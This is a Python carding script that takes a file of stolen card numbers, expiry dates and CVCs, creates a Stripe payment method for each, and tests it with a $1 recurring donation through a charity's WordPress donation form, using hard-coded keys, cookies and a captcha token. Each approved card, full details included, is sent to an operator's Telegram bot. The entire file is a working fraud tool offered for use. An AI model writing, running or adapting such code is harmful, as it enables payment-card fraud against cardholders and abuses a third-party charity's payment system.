try:
	import requests,re,time
	from colorama import Fore
	from bs4 import BeautifulSoup
	import pyfiglet
	import os
	import time
except ImportError:
	os.system('pip install requests')
	os.system('pip install re')
	os.system('pip install time')
	os.system('pip install colorama')
	os.system('pip install bs4')
	os.system('pip install pyfiglet')


D = '\033[2;32m'
E = '\033[2;31m'

F = '\033[0m'  
M = '\033[1;35m'  
E = ''  
X = '>>>'  
E = '\033[2;33m'
E = '\033[2;34m'
B = '\033[2;35m'
token = input(f' {F}({M}1{F}) {M} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + E)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}2{F}) {M} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + E)
logo = pyfiglet.figlet_format('')
print(B+logo)
L = '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n'
print(D+L)
path = input("Cambo :  ")
start = 0
with open(path) as file:
                lino = file.readlines()
                lino = [line.rstrip() for line in lino]
                
for e in lino:
	time.sleep(5)
	n = e.split('|')[0]
	mm = e.split('|')[1]
	yy = e.split('|')[2][-2:]
	cvc = e.split('|')[3]
	card=e.replace('\n','')
	
	
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Dievn&billing_details[email]=haowxjds%40gmail.com&billing_details[address][line1]=Kaode5+City&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=87e42ba5-9910-462d-8b5e-69ea049036fad3667d&muid=e3385f96-ab50-440b-b4fc-62efc795e561fa4880&sid=7163a14d-1ac8-40fe-a426-b5b031f5611f263c50&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=88364&client_attribution_metadata[client_session_id]=80615da3-cce9-4376-823b-57c20b5afe79&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY2MDE1MTU2LCJjZGF0YSI6IlJCNHA2M25xZGg4YSsxc1o3NTNmTXlydkh1L21zUFZQSVdtRW5aS2lqYU54UlFqZkxwVGNSNTl3OW1GVk4rZGxUTE91RTN1RktpaGVGcWNwUjk1MUN2UDNVVkE3U2JGM2pqWGtyV3ZQSEdQRHlFOTZmYWJ6bjJiS0QwOTlWQUNYalNnTG9oS3NYVVlZYzZENWltSDZRWEhWVkdnZXNEbmRhbUowNlF5N3E3cUxUWW9JeDBLYkZTNmlUVFhIcmpPbVFBUjUzWTBZK0NmMHJ0YzgiLCJwYXNza2V5IjoiSnhNK2NGYmZXaEpzdGV5NVJPWkR1R1c4bVJXRXpyYkVvYkNZRHlrdzZCNEhXOUkrMnNxYm5vZk5OOGRPNmpRS1VKMUVRTmh2TENJSmh0QWNxWm9UZXQyMTBzY0plOVlZMU00UDdJYVFKdEZZbjdnVkpHU1BTYkdCbTZFVXI4clljR0FyYkJudTlsSTV5b3o1RzRlbDdZZmpsc3ZPMEhOUjF1ZEZwcHlZTWhXeFNoR1krVWxURGJlYUswQXlHem9sa3czd1k2ajMvQTJTaXlBbmxZb09kRXNtc3Rsd1F4TVhyYVlDNjVQVUFPUFRiVlpkcGRyeS9kajBmdm9EWDRpS2hFZnVFTmtubFYzZU1iTktwSUhUOU03VEN4T3ErM01ZWFQzSVBIbXNlV2xHZHRDcFdWYWI1dmJFRnB3YnV2Vnl3MmJwZlFaa0lzTVJGK0ZKcXg0V3RmOEY5OHNMZDhHdHZDWkxWZzJjMmYrWVdrSlhKVUVaSnlCTlZWNWd4U3ZFQjVBNEcxcERRb3EvQUtBL2NLSElBbXEzQWRBakt6bGJoTWJGYWZJZEVKdnk3RnI5aUpGQVZXTk5LSEtNb2ZMTkVlc2Frd2ZkRG1oQWQydklnUXFKcGtoK09XT2ZOZHpjdW5KdVZKRE0rN0JjRDBJcDhhVEl6Ym1sdENqaEhhZ2tKVWpjYXBENUJERk9jU1VyajBjYUVZVlhWbzNjaW5VM000UXg1Y1pkdExzcHVDNDVHNXdIRWtrekVVODJ6cmpCM25pMDlSZm9yQyt4V002ZWRqYi9KTDRYWTJ4R1ZhbzRqajJBbnN0Z3JLUi9hWmJadVo5QXlJRjNGYU1SNGgxU0RybWlPdXRCeTA3L0RCc1h6SFZzWWZ0dXFPODdrbzd6aHFhR3NBOFI5QVU5elozZDl3UWVSTzZpbDRHTG1Nb0hBTmhsQnJ4NFEzV2lod0lVa0V2L0FrSTBDQTkrMi9OK2Y2S2FYd2NKV3RlVTJ3N3l6Nk1Fb0ROZ2g2Rk05WWVjNjRLSGVYeWhac1FqbW1ybjNyLzJZSXU5dlFGZHdpK2xudHhOWkNSeDVvNjh4Q0xQSktkZHl4cTFUeWVFbXdxVndGdHVMM1JYL01LbTc2c3BNNEpBVDkxRWc1Y3F2WmE4N0RnMmFTWjJLdEU5cGM5M1RMSitkOHZoNE04SkJMM3lUTmpUS1lkTVc5UmM1bW9PUXA2QjJpT0Q0TUhDS3BmbXZ2cHJBZG5XWHZHVE1PczlqaFhGWVVqb2RUNHFzbW01REUwakdRV3JFMEsxRmkwdE5ucnJzMEdnOTdnMitxdXFiN2owUElMN1RpZE9HdE05Y0lRL2tRMlp4cjBRU2o3blRtTmVnbkt2L2MrUGlqV3JhSXVwQUdIa1hXQjE1UDExSFU2eVNVR0g0cm92bjhNODJ0bXVEQlRUaE92WllieWpVc2dDT2ZObFp1bldSc1Fjb2VnVkY5bkluaVZFeUpkWGgrbjdsT2ZWSUN3MTBuQU0vTkJSbHZLWjNjSjUycGozYXRNNUZJMmpZa05IWTJEV2F0SzNQT0JzQ2h6NGI2RmE3MUxjZVZGdnpLUE1SaWthajNLbURUQkV4UTBLTkpDR0pKQm84UC9ZdTNmTTYzeVRTN3ovMHN4Yjk2elIwQ1M1c3dOc1FoZ3ExTUg5TkFBKzJ4L1pSNzNtY0h0WDhuS0lGQ0dZdXpWN0hTSnhhczQrSzBxZzY5MyszcmVKQW9odVZEa2Y4V2xvUGZ5N04yS0x5ME1vTWpFMEZub3NkSlBSS0ZHajNpKzVYMFhiR3lFMVg2ZThkUzhLRDY2b3QrS3ZQMWkyVWJZcHhTcHIyQUZyZHdadkppMXFzRkJpdVlFRDZOejBwcnJVUmJDbW5UcTJjRy9hRFE1bWVoL2NEblFXRVR0NXRIeWNwY2ljbWg0NGlxKzRGZXBua1BJUGZCM0padmt5MVdMeFNYTTI5SzJvYlZYQkkzT3RQd1F6cTBjZlQ2Nk5GS2Z3anpFczh2N0pjTmJQajI4eWJTd2dyYm56T2QwSE85RW5oSTZ1QlhCdk91a3d2NnBpcnlXdzJIb0N6c2ZjckZJNmNMcTVIOERuUm5HK0lpTG13UUdvdG55MklyN09qV3JLaHBrRHdtWFNLRVFhWHdvZVZjY08ydVZIQUVzTEZFN003OWF0YnkrMWxyeks2VU1KNklUK0RrL1NSelF0MElXVTdUVHFOMXB1MEM4Z0E0ZUQyN3IrdnNzWUx5R01HeUFlQ0JtQzN0UlcrMzkxZklBU1VQb1E2NDEzZDF0TTNybkxpTFJtbDBNa1o4eFByNzJXbkg0ZURZTmQ1VWl5cWRHYWNscDV6dnJWUVVrWmpSU3QzZVJWYzlJbnhhT3FBUThIR2NEcXN1aWhrT0UwbkxUZzFEM3ltS1l4YXpYd3IxUlhKbWRYUE03Ti9WSVpGd2hlQU5oZmMwbXJ2eHA5ZGE2cHVUU21zQ2ZSMUZsNzdUNmFjalAzRE9kQ0tCZ1QzTjBBbXFKQWFMczhMckszc1hyM2FGdnZRYmoxanU5a1F4UXF5a25PNEs4dFkrcE50dzFjVFJ2cUJIdXcvNlRjOGJLNkxpMjgrd0FQaWxaN0lmRkxnUmlGa0xjTFdCS3JYZWZ5cmFaVzBYeHVqK0UzMjNDeS9IWjZBVW93Tk5aVjk0UXhvL29FdzdNejdjRFMiLCJrciI6IjMyMjNlZDAxIiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.u0G0Gyzy225QmYEEQ4ns_bg6JE9jYTuc_P6iyTYLTuU'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	id = (response.json()['id'])
	
	
	
	import requests
	
	cookies = {
	    'charitable_session': 'c1b961b01bb71fc3f428e8cdfede29ef||86400||82800',
	    '__stripe_mid': 'e3385f96-ab50-440b-b4fc-62efc795e561fa4880',
	    '__stripe_sid': '7163a14d-1ac8-40fe-a426-b5b031f5611f263c50',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-12-17%2023%3A42%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2025-12-17%2023%3A42%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F',
	}
	
	headers = {
	    'authority': 'ccfoundationorg.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://ccfoundationorg.com',
	    'referer': 'https://ccfoundationorg.com/donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'charitable_form_id': '69433fc4b65ac',
	    '69433fc4b65ac': '',
	    '_charitable_donation_nonce': '49c3e28b2a',
	    '_wp_http_referer': '/donate/',
	    'campaign_id': '988003',
	    'description': 'CC Foundation Donation Form',
	    'ID': '1056420',
	    'donation_amount': 'custom',
	    'custom_donation_amount': '1.00',
	    'recurring_donation': 'month',
	    'title': 'Mr',
	    'first_name': 'bodu',
	    'last_name': 'Diven',
	    'email': 'haowxjds@gmail.com',
	    'address': 'Kaode5 City',
	    'postcode': '10080',
	    'gateway': 'stripe',
	    'stripe_payment_method': id,
	    'action': 'make_donation',
	    'form_action': 'make_donation',
	}
	
	response = requests.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	
	msg=response.text

	if 'requires_action' in msg or 'successed' in msg or 'Thank you' in msg:
	    print(Fore.GREEN+f"{e} >> APPROVED ✅{msg}")
	    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&parse_mode=HTML&text=<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ <code>{e}</code>\n[↯] 𝗚𝗔𝗧𝗘𝗦: Stripe Charge1$\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: success 🟢\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ۦ</b>")

	else:
		ms = response.json()
		print(Fore.RED+f"{e} >>  "+msg+' ❌')